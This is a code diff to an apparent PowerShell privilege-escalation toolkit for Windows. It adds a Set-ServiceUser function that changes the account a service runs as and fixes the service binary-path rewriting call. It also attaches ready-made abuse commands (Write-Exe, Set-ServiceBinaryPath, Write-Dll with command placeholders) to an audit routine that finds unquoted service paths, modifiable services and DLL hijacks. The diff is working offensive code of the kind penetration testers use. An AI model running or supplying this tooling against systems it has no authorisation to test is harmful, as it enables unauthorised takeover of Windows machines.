@@ -1003,6 +1003,9 @@ function Get-ModifiableServiceFile {
             $LoopCount = 0
             $ParentPaths = @()
             $Parent = Split-Path -Path $ServicePath -Parent
+            if( $Parent -eq "" ) {
+                continue
+            }
             while( ($Parent -ne 'C:\') -and ($AlreadyChecked -notcontains $Parent) ) {
                 $ParentPaths += $Parent
                 $Parent = Split-Path -Path $Parent -Parent
@@ -1244,6 +1247,7 @@ function Set-ServiceBinaryPath {
             $RawHandle
         }
         try {
+            Add-Type -AssemblyName system.serviceprocess
             $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
             $Services = $GetServices.Invoke($null, $null)
         } catch [System.InvalidOperationException] {
@@ -1266,9 +1270,74 @@ function Set-ServiceBinaryPath {
             }
             if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
                 $SERVICE_NO_CHANGE = [UInt32]::MaxValue
-                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [NullString]::Value, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                 if ($Result -ne 0) {
                     Write-Host "[+] binPath for $IndividualService successfully set to '$Path'"
+                }
+                else {
+                    Write-Error ([ComponentModel.Win32Exception] $LastError)
+                }
+                $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
+            }
+        }
+    }
+}
+function Set-ServiceUser {
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('ServiceName')]
+        [String[]]
+        [ValidateNotNullOrEmpty()]
+        $Name,
+        [Parameter(Position=1, Mandatory = $True)]
+        [Alias('ServiceUser', 'StartName')]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $User
+    )
+    BEGIN {
+        filter Local:Get-ServiceConfigControlHandle {
+            [OutputType([IntPtr])]
+            Param(
+                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
+                [ServiceProcess.ServiceController]
+                [ValidateNotNullOrEmpty()]
+                $TargetService
+            )
+            $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
+            $ConfigControl = 0x00000002
+            $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
+            $RawHandle
+        }
+        try {
+            Add-Type -AssemblyName system.serviceprocess
+            $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
+            $Services = $GetServices.Invoke($null, $null)
+        } catch [System.InvalidOperationException] {
+            Write-Error "Service enumeration via ServiceController: Failed. [Access Denied]"
+            return $null
+        }
+    }
+    PROCESS {
+        ForEach($IndividualService in $Name) {
+            $TargetService = $Services | Where-Object { $_.Name -eq $IndividualService }
+            if( $TargetService -eq $null ) {
+                Write-Error "Specified service '$IndividualService' not found."
+            }
+            try {
+                $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
+            }
+            catch {
+                $ServiceHandle = $Null
+                Write-Error "Error opening up the service handle with read control for $IndividualService : $_"
+            }
+            if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
+                $SERVICE_NO_CHANGE = [UInt32]::MaxValue
+                $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, [NullString]::Value, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, "$User", [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                if ($Result -ne 0) {
+                    Write-Host "[+] StartName for $IndividualService successfully set to '$User'"
                 }
                 else {
                     Write-Error ([ComponentModel.Win32Exception] $LastError)
@@ -2366,19 +2435,22 @@ function Invoke-PrivescAudit {
         @{
             Type    = 'Unquoted Service Paths'
             Command = { $Services | Get-UnquotedService }
+            AbuseScript = { "Write-Exe -Path '<PATH>' -Command '<CMD>'" }
         },
         @{
             Type    = 'Modifiable Service Files'
             Command = { $Services | Get-ModifiableServiceFile }
+            AbuseScript = { "Write-Exe -Path '<PATH>' -Command '<CMD>'" }
         },
         @{
             Type    = 'Modifiable Services'
             Command = { $Services | Test-ServiceDaclPermission }
+            AbuseScript = { "Set-ServiceBinaryPath -Name '$($_.ServiceName)' -Path '<PATH>'" }
         },
         @{
             Type        = '%PATH% .dll Hijacks'
             Command     = { Find-PathDLLHijack }
-            AbuseScript = { "Write-HijackDll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
+            AbuseScript = { "Write-Dll -DllPath '$($_.ModifiablePath)\wlbsctrl.dll' -Command '<CMD>'" }
         },
         @{
             Type        = 'AlwaysInstallElevated Registry Key'
@@ -2467,7 +2539,7 @@ $FunctionDefinitions = @(
     (func advapi32 LookupPrivilegeName ([Int]) @([IntPtr], [IntPtr], [String].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
     (func advapi32 QueryServiceConfig ([Bool]) @([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError -Charset Unicode),
     (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
-    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
+    (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [String], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
     (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError),
     (func ntdll RtlAdjustPrivilege ([UInt32]) @([Int32], [Bool], [Bool], [Int32].MakeByRefType()))
 )
